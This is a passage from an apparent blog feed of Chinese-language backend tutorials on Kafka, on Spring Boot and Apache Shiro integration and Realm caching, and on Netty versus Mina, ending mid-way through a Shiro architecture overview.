        <content type="html"><![CDATA[<p><img src="http://img.orchome.com:8888/group1/M00/00/01/KmCudlf4YWCAbQPXAASxr5laXjI309.png" alt="image"></p><p><strong>Kafka简介</strong></p><p>Kafka是一种高吞吐量的分布式发布订阅消息系统，是消息中间件的一种。它可以处理消费者规模的网站中的所有动作流数据，它是由Apache软件基金会开发的一个开源流处理平台，由Scala和Java编写。</p><p>kafka可用于构建实时数据管道和流应用程序，具有横向扩展、容错、wicked fast（变态快）等优点，并已在成千上万家公司运行。</p><blockquote><p>官网：kafka.apache.org&#x2F;</p></blockquote><p><strong>Kafka相关术语</strong></p><ul><li>Broker</li></ul><p>Kafka集群包含一个或多个服务器，这种服务器被称为broker。</p><ul><li>Topic</li></ul><p>每条发布到Kafka集群的消息都有一个类别，这个类别被称为Topic。</p><ul><li>Partition</li></ul><p>Partition是物理上的概念，每个Topic包含一个或多个Partition。</p><ul><li>Producer</li></ul><p>负责发布消息到Kafka broker。</p><ul><li>Consumer</li></ul><p>消息消费者，向Kafka broker读取消息的客户端。</p><ul><li>Consumer Group</li></ul><p>每个Consumer属于一个特定的Consumer Group（可为每个Consumer指定group name，若不指定group name则属于默认的group）。</p><p><strong>kafka核心API</strong></p><ul><li>Producer API</li></ul><p>应用程序使用Producer API发布消息到1个或多个topic（主题）。</p><ul><li>Consumer API</li></ul><p>应用程序使用Consumer API来订阅一个或多个topic，并处理产生的消息。</p><ul><li>Streams API</li></ul><p>应用程序使用Streams API充当一个流处理器，从1个或多个topic消费输入流，并生产一个输出流到1个或多个输出topic，有效地将输入流转换到输出流。</p><ul><li>Connector API</li></ul><p>Connector API允许构建或运行可重复使用的生产者或消费者，将topic连接到现有的应用程序或数据系统。例如，一个关系数据库的连接器可捕获每一个变化。</p><p><img src="http://img.orchome.com:8888/group1/M00/00/01/KmCudlf7DXiAVXBMAAFScKNS-Og538.png" alt="image"></p><p>Client和Server之间的通讯，是通过一条简单、高性能并且和开发语言无关的TCP协议。并且该协议保持与老版本的兼容。Kafka提供了Java Client（客户端）。除了Java Client外，还有非常多的其它编程语言的Client。</p><p><strong>Kakfa有什么优势？</strong></p><p>1、保证消息消费的有序性.</p><p>2、在多个consumer组的并发处理消息的情况下，保证有序性和负载均衡。</p><p>下面是一些关于Apache kafka 流行的使用场景。</p><p><strong>Kakfa的使用场景</strong></p><ul><li>消息</li></ul><p>kafka更好的替换传统的消息系统，消息系统被用于各种场景（解耦数据生产者，缓存未处理的消息，等），与大多数消息系统比较，kafka有更好的吞吐量，内置分区，副本和故障转移，这有利于处理大规模的消息。</p><p>根据我们的经验，消息往往用于较低的吞吐量，但需要低的端到端延迟，并需要提供强大的耐用性的保证。</p><p>在这一领域的kafka比得上传统的消息系统，如的ActiveMQ或RabbitMQ的</p><ul><li>网站活动追踪</li></ul><p>kafka原本的使用场景：用户的活动追踪，网站的活动（网页游览，搜索或其他用户的操作信息）发布到不同的话题中心，这些消息可实时处理，实时监测，也可加载到Hadoop或离线处理数据仓库。</p><p>每个用户页面视图都会产生非常高的量。</p><ul><li>指标</li></ul><p>kafka也常常用于监测数据。分布式应用程序生成的统计数据集中聚合。</p><ul><li>日志聚合</li></ul><p>使用kafka代替一个日志聚合的解决方案。</p><ul><li>流处理</li></ul><p>kafka消息处理包含多个阶段。其中原始输入数据是从kafka主题消费的，然后汇总，丰富，或者以其他的方式处理转化为新主题，例如，一个推荐新闻文章，文章内容可能从“articles”主题获取；然后进一步处理内容，得到一个处理后的新内容，最后推荐给用户。这种处理是基于单个主题的实时数据流。从0.10.0.0开始，轻量，但功能强大的流处理，就进行这样的数据处理了。</p><p>除了Kafka Streams，还有Apache Storm和Apache Samza可选择。</p><ul><li>事件采集</li></ul><p>事件采集是一种应用程序的设计风格，其中状态的变化根据时间的顺序记录下来，kafka支持这种非常大的存储日志数据的场景。</p><ul><li>提交日志</li></ul><p>kafka可以作为一种分布式的外部提交日志，日志帮助节点之间复制数据，并作为失败的节点来恢复数据重新同步，kafka的日志压缩功能很好的支持这种用法，这种用法类似于Apacha BookKeeper项目。</p><blockquote><p>参考：<a href="http://orchome.com/kafka/index">http://orchome.com/kafka/index</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kafka </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文搞定 Spring Boot &amp; Shiro 实战</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Shrio/%E4%B8%80%E6%96%87%E6%90%9E%E5%AE%9A%20Spring%20Boot%20&amp;%20Shiro%20%E5%AE%9E%E6%88%98/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Shrio/%E4%B8%80%E6%96%87%E6%90%9E%E5%AE%9A%20Spring%20Boot%20&amp;%20Shiro%20%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p>Spring Boot集成Shiro权限验证框架，可参考：</p><blockquote><p><a href="https://shiro.apache.org/spring-boot.html">https://shiro.apache.org/spring-boot.html</a></p></blockquote><h2 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h2><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;org.apache.shiro&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;shiro-spring-boot-web-starter&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.4.0&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置Shiro"><a href="#配置Shiro" class="headerlink" title="配置Shiro"></a>配置Shiro</h2><p><strong>ShiroConfig</strong>：</p><pre class="line-numbers language-none"><code class="language-none">@ConfigurationProperties(prefix &#x3D; &quot;shiro&quot;)@Configurationpublic class ShiroConfig &#123;@Autowiredprivate ApplicationConfig applicationConfig;private List&lt;String&gt; pathDefinitions;@Beanpublic ShiroFilterChainDefinition shiroFilterChainDefinition() &#123;DefaultShiroFilterChainDefinition chainDefinition &#x3D; newDefaultShiroFilterChainDefinition();applicationConfig.getStaticDirs().forEach(s -&gt; chainDefinition.addPathDefinition(s, &quot;anon&quot;));this.getPathDefinitions().forEach(d -&gt; &#123;String[] defArr &#x3D; d.split(&quot;&#x3D;&quot;);chainDefinition.addPathDefinition(StringUtils.trim(defArr[0]), StringUtils.trim(defArr[1]));&#125;);return chainDefinition;&#125;@Beanpublic Realm systemRealm() &#123;SystemRealm systemRealm &#x3D; new SystemRealm();return systemRealm;&#125;public List&lt;String&gt; getPathDefinitions() &#123;return pathDefinitions;&#125;public void setPathDefinitions(List&lt;String&gt; pathDefinitions) &#123;this.pathDefinitions &#x3D; pathDefinitions;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ApplicationConfig</strong>：注入的是application.yml中的配置，略。</p><p><strong>SystemRealm：</strong></p><pre class="line-numbers language-none"><code class="language-none">public class SystemRealm extends AuthorizingRealm &#123;@Autowiredprivate SysAdminMapper sysAdminMapper;@Overrideprotected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken)throws AuthenticationException &#123;UsernamePasswordToken token &#x3D; (UsernamePasswordToken) authenticationToken;token.setPassword(EcryptUtils.encode(String.valueOf(token.getPassword())).toCharArray());SysAdminDO sysAdminParams &#x3D; new SysAdminDO();sysAdminParams.setAdminLoginName(token.getUsername());SysAdminDO sysAdminDO &#x3D; sysAdminMapper.selectByParams(sysAdminParams);AuthenticationInfo authInfo &#x3D; null;if (sysAdminDO !&#x3D; null) &#123;authInfo &#x3D; new SimpleAuthenticationInfo(sysAdminDO, sysAdminDO.getAdminLoginPass(),getName());&#125;return authInfo;&#125;@Overrideprotected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) &#123;&#x2F;** * 下面为静态示例，根据用户对应权限进行修改 * 根据用户查询对应的角色、权限 *&#x2F;SysAdminDO sysAdminDO &#x3D; (SysAdminDO) super.getAvailablePrincipal(principalCollection);SimpleAuthorizationInfo authorizationInfo &#x3D; new SimpleAuthorizationInfo();Set&lt;String&gt; roles &#x3D; new HashSet&lt;&gt;();roles.addAll(Arrays.asList(&quot;product&quot;, &quot;operation&quot;));authorizationInfo.setRoles(roles);Set&lt;String&gt; permissions &#x3D; new HashSet&lt;&gt;();permissions.addAll(Arrays.asList(&quot;product:create&quot;, &quot;product:del&quot;, &quot;operation:update&quot;));authorizationInfo.addStringPermissions(permissions);return authorizationInfo;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="应用配置"><a href="#应用配置" class="headerlink" title="应用配置"></a>应用配置</h2><p>application.yml中加入Shiro配置。</p><pre class="line-numbers language-none"><code class="language-none">shiro:  loginUrl: &#x2F;login  successUrl: &#x2F;  unauthorizedUrl: &#x2F;error  pathDefinitions:    - &#x2F;login&#x2F;submit &#x3D; anon    - &#x2F;logout &#x3D; logout    - &#x2F;test &#x3D; authc, roles[product], perms[operation:update]    - &#x2F;** &#x3D; authc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>loginUrl</strong>：没有认证的将会跳到登录页面。</p><p><strong>successUrl</strong>：认证成功跳转的页面。</p><p><strong>unauthorizedUrl</strong>：认证失败跳转的页面。</p><p><strong>pathDefinitions</strong>：用来定义路径授权规则。</p><p>更多参数参考官网定义：</p><blockquote><p><a href="https://shiro.apache.org/spring-boot.html#configuration-properties">https://shiro.apache.org/spring-boot.html#configuration-properties</a></p></blockquote><h2 id="登录服务类"><a href="#登录服务类" class="headerlink" title="登录服务类"></a>登录服务类</h2><pre class="line-numbers language-none"><code class="language-none">@Overridepublic SysAdminDO login(LoginForm form) &#123;UsernamePasswordToken token &#x3D; new UsernamePasswordToken(form.getLoginName(),form.getLoginPassword());token.setRememberMe(true);Subject currentUser &#x3D; getSubject();try &#123;currentUser.login(token);&#125; catch (Exception e) &#123;logger.error(&quot;登录验证失败：&quot;, e);&#125;return (SysAdminDO) currentUser.getPrincipal();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="自带的过滤器"><a href="#自带的过滤器" class="headerlink" title="自带的过滤器"></a>自带的过滤器</h2><p>anno, authc等更多定义参考类：</p><pre class="line-numbers language-none"><code class="language-none">org.apache.shiro.web.filter.mgt.DefaultFilter<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>官网定义：</p><blockquote><p><a href="http://shiro.apache.org/web.html#default-filters">http://shiro.apache.org/web.html#default-filters</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro Realm 权限的验证流程和缓存机制</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Shrio/Shiro%20Realm%20%E6%9D%83%E9%99%90%E7%9A%84%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B%E5%92%8C%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Shrio/Shiro%20Realm%20%E6%9D%83%E9%99%90%E7%9A%84%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B%E5%92%8C%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>我们可以定义多个Realm权限类，继承AuthenticatingRealm。</p><p>如果是这样，那Shiro验证的策略和顺序是怎样的呢？</p><h2 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h2><p>通过查看源码，Shiro的Spring Boot自动配置是至少一个通过策略，即有一个权限类通过就判定有权限并通过。</p><p>自动配置类：</p><blockquote><p>org.apache.shiro.spring.config.web.autoconfigure.ShiroWebAutoConfiguration</p></blockquote><pre class="line-numbers language-none"><code class="language-none">@Bean@ConditionalOnMissingBean@Overrideprotected AuthenticationStrategy authenticationStrategy() &#123;    return super.authenticationStrategy();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">protected AuthenticationStrategy authenticationStrategy() &#123;    return new AtLeastOneSuccessfulStrategy();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其他还有全部通过、首个通过，更多可以查看Shiro包下面的权限策略。</p><blockquote><p>org.apache.shiro.authc.pam</p></blockquote><h2 id="顺序"><a href="#顺序" class="headerlink" title="顺序"></a>顺序</h2><p>Shiro是按在Spring Boot配置类中定义Realm Bean的顺序进行验证权限的。</p><h2 id="验证流程"><a href="#验证流程" class="headerlink" title="验证流程"></a>验证流程</h2><p>假设现在有R1,R2权限类，现在我们对一个方法或者路径配置了A角色，B、C权限，Shiro会在R1中找A角色，找到则继续验证其他权限，找不到根据策略决定，如果说不是全部都要通过的策略则会继续在R2中找A角色，找不到则跳到指定的未授权链接，B、C权限验证流程也是一致。</p><h2 id="Shiro缓存"><a href="#Shiro缓存" class="headerlink" title="Shiro缓存"></a>Shiro缓存</h2><p>为了权限验证的效率性能，Shiro对认证和授权是有缓存开关控制的。</p><p>需要了解的权限类层次是，每个Realm都继承AuthorizingRealm，AuthorizingRealm继承自AuthenticatingRealm。AuthenticatingRealm是认证的逻辑，AuthorizingRealm是授权的逻辑。</p><p>通过查看AuthorizingRealm和AuthenticatingRealm源码，默认的认证缓存是关闭的，授权缓存是开启的。</p><blockquote><p>authorizationCachingEnabled &#x3D; true; &#x2F;&#x2F; 授权</p></blockquote><blockquote><p>authenticationCachingEnabled &#x3D; false; &#x2F;&#x2F; 认证</p></blockquote><p>这里默认开启了缓存还不行，还需要设置CacheManager，如下。</p><pre class="line-numbers language-none"><code class="language-none">@Beanpublic CacheManager cacheManager() &#123;return new MemoryConstrainedCacheManager();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>具体的缓存逻辑可以翻阅以下源码。</p><blockquote><p>org.apache.shiro.realm.AuthorizingRealm#getAuthorizationInfo</p></blockquote><blockquote><p>org.apache.shiro.realm.AuthenticatingRealm#getAuthenticationInfo</p></blockquote><h2 id="设置缓存开关"><a href="#设置缓存开关" class="headerlink" title="设置缓存开关"></a>设置缓存开关</h2><p>有的时候我们的权限不是固定的，需要动态的调整授权，所以希望某些Realm不需要缓存。</p><p>我们可以在当前Realm中手动关闭某它的的授权缓存。</p><pre class="line-numbers language-none"><code class="language-none">this.setAuthorizationCachingEnabled(false);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同上，默认关闭的认证的缓存也可以通过设置进行打开。</p><p>根据具体的业务进行灵活调整。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么 Netty 这么火？与 Mina 相比有什么优势</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Netty/%E4%B8%BA%E4%BB%80%E4%B9%88%20Netty%20%E8%BF%99%E4%B9%88%E7%81%AB%EF%BC%9F%E4%B8%8E%20Mina%20%E7%9B%B8%E6%AF%94%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E5%8A%BF/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Netty/%E4%B8%BA%E4%BB%80%E4%B9%88%20Netty%20%E8%BF%99%E4%B9%88%E7%81%AB%EF%BC%9F%E4%B8%8E%20Mina%20%E7%9B%B8%E6%AF%94%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<p><img src="http://1ke.co/files/course/2017/03-01/145741594b4c665232.png?4.9.3" alt="image"></p><p><strong>Netty是什么？为什么这么火？</strong></p><p>Netty是目前最流行的由JBOSS提供的一个Java开源框架NIO框架，Netty提供异步的、事件驱动的网络应用程序框架和工具，用以快速开发高性能、高可靠性的网络服务器和客户端程序。</p><p>相比JDK原生NIO，Netty提供了相对十分简单易用的API，非常适合网络编程。Netty是完全基于NIO实现的，所以Netty是异步的。</p><p>作为一个异步NIO框架，Netty的所有IO操作都是异步非阻塞的，通过Future-Listener机制，用户可以方便的主动获取或者通过通知机制获得IO操作结果。</p><p>Netty无疑是NIO的老大，它的健壮性、功能、性能、可定制性和可扩展性在同类框架都是首屈一指的。它已经得到成百上千的商业&#x2F;商用项目验证，如Hadoop的RPC框架Avro、RocketMQ以及主流的分布式通信框架Dubbo等等。</p><p>为什么这么火，是有原因的。</p><p><strong>Netty的优点可以总结如下</strong></p><p>1、API使用简单，开发门槛低；</p><p>2、功能强大，预置了多种编解码功能，支持多种主流协议；</p><p>3、定制能力强，可以通过ChannelHandler对通信框架进行灵活地扩展；</p><p>4、性能高，通过与其他业界主流的NIO框架对比，Netty的综合性能最优；</p><p>5、成熟、稳定，Netty修复了已经发现的所有JDK NIO BUG，业务开发人员不需要再为NIO的BUG而烦恼；</p><p>6、社区活跃，版本迭代周期短，发现的BUG可以被及时修复，同时，更多的新功能会加入；</p><p>7、经历了大规模的商业应用考验，质量得到验证。在互联网、大数据、网络游戏、企业应用、电信软件等众多行业得到成功商用，证明了它已经完全能够满足不同行业的商业应用了。</p><p><strong>与Mina相比有什么优势？</strong></p><p>1、都是Trustin Lee的作品，Netty更晚；</p><p>2、Mina将内核和一些特性的联系过于紧密，使得用户在不需要这些特性的时候无法脱离，相比下性能会有所下降，Netty解决了这个设计问题；</p><p>3、Netty的文档更清晰，很多Mina的特性在Netty里都有；</p><p>4、Netty更新周期更短，新版本的发布比较快；</p><p>5、它们的架构差别不大，Mina靠apache生存，而Netty靠jboss，和jboss的结合度非常高，Netty有对google protocal buf的支持，有更完整的ioc容器支持(spring,guice,jbossmc和osgi)；</p><p>6、Netty比Mina使用起来更简单，Netty里你可以自定义的处理upstream events或&#x2F;和downstream events，可以使用decoder和encoder来解码和编码发送内容；</p><p>7、Netty和Mina在处理UDP时有一些不同，Netty将UDP无连接的特性暴露出来；而Mina对UDP进行了高级层次的抽象，可以把UDP当成”面向连接”的协议，而要Netty做到这一点比较困难。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Netty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非常详尽的 Shiro 架构解析</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Shrio/%E9%9D%9E%E5%B8%B8%E8%AF%A6%E5%B0%BD%E7%9A%84%20Shiro%20%E6%9E%B6%E6%9E%84%E8%A7%A3%E6%9E%90/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Shrio/%E9%9D%9E%E5%B8%B8%E8%AF%A6%E5%B0%BD%E7%9A%84%20Shiro%20%E6%9E%B6%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><img src="https://upload.wikimedia.org/wikipedia/commons/0/06/Apache_Shiro_Logo.png" alt="image"></p><h2 id="Shiro是什么？"><a href="#Shiro是什么？" class="headerlink" title="Shiro是什么？"></a>Shiro是什么？</h2><p>Apache Shiro是一个强大而灵活的开源安全框架，它干净利落地处理身份认证，授权，企业会话管理和加密。</p><p>Apache Shiro的首要目标是易于使用和理解。安全有时候是很复杂的，甚至是痛苦的，但它没有必要这样。框架应该尽可能掩盖复杂的地方，露出一个干净而直观的API，来简化开发人员在使他们的应用程序安全上的努力。</p><blockquote><p>官网：<a href="http://shiro.apache.org/">http://shiro.apache.org</a></p></blockquote><h2 id="Shiro有什么用？"><a href="#Shiro有什么用？" class="headerlink" title="Shiro有什么用？"></a>Shiro有什么用？</h2><p>以下是你可以用Apache Shiro所做的事情：</p><ul><li><p>验证用户来核实他们的身份</p></li><li><p>对用户执行访问控制，如：</p></li></ul><ol><li><p>判断用户是否被分配了一个确定的安全角色；</p></li><li><p>判断用户是否被允许做某事；</p></li></ol><ul><li><p>在任何环境下使用Session API，即使没有Web或EJB容器。</p></li><li><p>在身份验证，访问控制期间或在会话的生命周期，对事件作出反应。</p></li><li><p>聚集一个或多个用户安全数据的数据源，并作为一个单一的复合用户“视图”。</p></li><li><p>启用单点登录（SSO）功能。</p></li><li><p>为没有关联到登录的用户启用”Remember Me”服务</p></li><li><p>以及更多——全部集成到紧密结合的易于使用的API中。</p></li></ul><p>Shiro 视图在所有应用程序环境下实现这些目标——从最简单的命令行应用程序到最大的企业应用，不强制依赖其<br>他第三方框架，容器，或应用服务器。当然，该项目的目标是尽可能地融入到这些环境，但它能够在任何环境下立<br>即可用。</p><h2 id="Shiro特性"><a href="#Shiro特性" class="headerlink" title="Shiro特性"></a>Shiro特性</h2><p>Apache Shiro是一个拥有许多功能的综合性的程序安全框架。</p><p><img src="http://dl2.iteye.com/upload/attachment/0093/9788/d59f6d02-1f45-3285-8983-4ea5f18111d5.png" alt="image"></p><h5 id="Shiro把Shiro开发团队称为“应用程序的四大基石”——身份验证，授权，会话管理和加密作为其目标。"><a href="#Shiro把Shiro开发团队称为“应用程序的四大基石”——身份验证，授权，会话管理和加密作为其目标。" class="headerlink" title="Shiro把Shiro开发团队称为“应用程序的四大基石”——身份验证，授权，会话管理和加密作为其目标。"></a>Shiro把Shiro开发团队称为“应用程序的四大基石”——身份验证，授权，会话管理和加密作为其目标。</h5><ul><li><p>Authentication：有时也简称为“登录”，这是一个证明用户是他们所说的他们是谁的行为。</p></li><li><p>Authorization：访问控制的过程，也就是绝对“谁”去访问“什么”。</p></li><li><p>Session Management：管理用户特定的会话，即使在非 Web 或 EJB 应用程序。</p></li><li><p>Cryptography：通过使用加密算法保持数据安全同时易于使用。</p></li></ul><h5 id="也提供了额外的功能来支持和加强在不同环境下所关注的方面，尤其是以下这些："><a href="#也提供了额外的功能来支持和加强在不同环境下所关注的方面，尤其是以下这些：" class="headerlink" title="也提供了额外的功能来支持和加强在不同环境下所关注的方面，尤其是以下这些："></a>也提供了额外的功能来支持和加强在不同环境下所关注的方面，尤其是以下这些：</h5><ul><li><p>Web Support：Shiro的web支持的API能够轻松地帮助保护 Web 应用程序。</p></li><li><p>Caching：缓存是Apache Shiro中的第一层公民，来确保安全操作快速而又高效。</p></li><li><p>Concurrency：Apache Shiro利用它的并发特性来支持多线程应用程序。</p></li><li><p>Testing：测试支持的存在来帮助你编写单元测试和集成测试，并确保你的能够如预期的一样安全。</p></li><li><p>“Run As”：一个允许用户假设为另一个用户身份（如果允许）的功能，有时候在管理脚本很有用。</p></li><li><p>“Remember Me”：在会话中记住用户的身份，所以他们只需要在强制时候登录。</p></li></ul><h2 id="Shiro-架构"><a href="#Shiro-架构" class="headerlink" title="Shiro 架构"></a>Shiro 架构</h2><p>Apache Shiro的设计目标是通过直观和易于使用来简化应用程序安全。Shiro 的核心设计体现了大多数人们是如何考<br>虑应用程序安全的——在某些人（或某些事）与应用程序交互的背景下。</p><p>应用软件通常是基于用户背景情况设计的。也就是说，你将经常设计用户接口或服务API，基于一个用户将要（或应该）如何与该软件交互。例如，你可能会说，“如果用户与我的应用程序交互的用户已经登录，我将显示一个他们能够点击的按钮来查看他们的帐户信息。如果他们没有登录，我将显示一个登录按钮。”</p><p>这个简单的陈述表明应用程序很大程度上的编写是为了满足用户的要求和需要。即使该“用户”是另一个软件系统而不是一个人类，你仍然得编写代码来响应行为，基于当前与你的软件进行交互的人或物。</p><p>Shiro在它自己的设计中体现了这些概念。通过匹配那些对于软件开发人员来说已经很直观的东西，Apache Shiro几<br>乎在任何应用程序保持了直观和易用性。</p><p>在最高的概念层次，Shiro的架构有3个主要的概念：Subject，SecurityManager 和 Realms。</p><p>下面的关系图是关于这<br>些组件是如何交互的高级概述，而且我们将会在下面讨论每一个概念：</p><p><img src="http://dl2.iteye.com/upload/attachment/0093/9790/5e0e9b41-0cca-367f-8c87-a8398910e7a6.png" alt="image"></p><ul><li><strong>Subject</strong></li></ul><p>在我们的教程中已经提到，Subject实质上是一个当前执行用户的特定的安全“视图”。鉴于”User”一词通常意味着一个人，而一个Subject可以是一个人，但它还可以代表第三方服务，daemon account，cron job，或其他类似的任何东西——基本上是当前正与软件进行交互的任何东西。</p><p>所有Subject实例都被绑定到（且这是必须的）一个SecurityManager上。当你与一个Subject交互时，那些交互作用转化为与SecurityManager交互的特定subject的交互作用。</p><ul><li><strong>SecurityManager</strong></li></ul><p>SecurityManager是Shiro架构的心脏，并作为一种“保护伞”对象来协调内部的安全组件共同构成一个对象图。然而，一旦SecurityManager和它的内置对象图已经配置给一个应用程序，那么它单独留下来，且应用程序开发人员几乎使用他们所有的时间来处理Subject API。</p><p>稍后会更详细地讨论SecurityManager，但重要的是要认识到，当你正与一个Subject进行交互时，实质上是幕后的 SecurityManager处理所有繁重的Subject安全操作。这反映在上面的基本流程图。</p><ul><li><strong>Realms</strong></li></ul><p>Realms担当Shiro和你的应用程序的安全数据之间的“桥梁”或“连接器”。当它实际上与安全相关的数据如用来执行身份验证（登录）及授权（访问控制）的用户帐户交互时，Shiro 从一个或多个为应用程序配置的Realm中寻找许多这样的东西。</p><p>在这个意义上说，Realm本质上是一个特定安全的DAO：它封装了数据源的连接详细信息，使Shiro所需的相关的数据可用。当配置Shiro时，你必须指定至少一个Realm用来进行身份验证和&#x2F;或授权。SecurityManager可能配置多个Realms，但至少有一个是必须的。</p><p>Shiro提供了立即可用的Realms来连接一些安全数据源（即目录），如LDAP，关系数据库（JDBC），文本配置源，像 INI 及属性文件，以及更多。你可以插入你自己的Realm 实现来代表自定义的数据源，如果默认地Realm不符合你的需求。</p><p>像其他内置组件一样，Shiro SecurityManager控制 Realms是如何被用来获取安全和身份数据来代表 Subject 实例的。</p><p>下图展示了Shiro的核心架构概念，紧跟其后的是每个的简短总结：</p><p><img src="http://dl2.iteye.com/upload/attachment/0093/9792/9b959a65-799d-396e-b5f5-b4fcfe88f53c.png" alt="image"></p><ul><li><strong>Subject</strong>(org.apache.shiro.subject.Subject)</li></ul><p>当前与软件进行交互的实体（用户，第三方服务，cron job，等等）的安全特定“视图”。</p><ul><li><strong>SecurityManager</strong>(org.apache.shiro.mgt.SecurityManager)</li></ul><p>如上所述，SecurityManager是Shiro架构的心脏。它基本上是一个“保护伞”对象，协调其管理的组件以确保它们能够一起顺利的工作。它还管理每个应用程序用户的Shiro 的视图，因此它知道如何执行每个用户的安全操作。</p><ul><li><strong>Authenticator</strong>(org.apache.shiro.authc.Authenticator)</li></ul><p>Authenticator是一个对执行及对用户的身份验证（登录）尝试负责的组件。当一个用户尝试登录时，该逻辑被 Authenticator执行。Authenticator知道如何与一个或多个Realm协调来存储相关的用户&#x2F;帐户信息。从这些Realm中获得的数据被用来验证用户的身份来保证用户确实是他们所说的他们是谁。</p><ul><li><strong>Authentication Strategy</strong>(org.apache.shiro.authc.pam.AuthenticationStrategy)</li></ul><p>如果不止一个Realm被配置，则AuthenticationStrategy将会协调这些Realm来决定身份认证尝试成功或失败下的条件（例如，如果一个Realm成功，而其他的均失败，是否该尝试成功？是否所有的Realm必须成功？或只有第一个成功即可？）。</p><ul><li><strong>Authorizer</strong>(org.apache.shiro.authz.Authorizer)</li></ul><p>Authorizer是负责在应用程序中决定用户的访问控制的组件。它是一种最终判定用户是否被允许做某事的机制。与 Authenticator相似，Authorizer也知道如何协调多个后台数据源来访问角色恶化权限信息。Authorizer使用该信息来准确地决定用户是否被允许执行给定的动作。</p><ul><li><strong>SessionManager</strong>(org.apache.shiro.session.SessionManager)</li></ul><p>SessionManager知道如何去创建及管理用户Session生命周期来为所有环境下的用户提供一个强健的Session体验。这在安全框架界是一个独有的特色——Shiro拥有能够在任何环境下本地化管理用户Session的能力，即使没有可用的Web&#x2F;Servlet或EJB容器，它将会使用它内置的企业级会话管理来提供同样的编程体验。SessionDAO的存在允许任何数据源能够在持久会话中使用。</p><ul><li><strong>SessionDAO</strong>(org.apache.shiro.session.mgt.eis.SessionDAO)</li></ul><p>SesssionDAO代表SessionManager执行Session持久化（CRUD）操作。这允许任何数据存储被插入到会话管理的基础之中。</p><ul><li><strong>CacheManager</strong>(org.apahce.shiro.cache.CacheManager)</li></ul><p>CacheManager创建并管理其他Shiro组件使用的Cache实例生命周期。因为Shiro能够访问许多后台数据源，由于身份验证，授权和会话管理，缓存在框架中一直是一流的架构功能，用来在同时使用这些数据源时提高性能。任何现代开源和&#x2F;或企业的缓存产品能够被插入到Shiro来提供一个快速及高效的用户体验。</p><ul><li><strong>Cryptography</strong>(org.apache.shiro.crypto.*)</li></ul><p>Cryptography是对企业安全框架的一个很自然的补充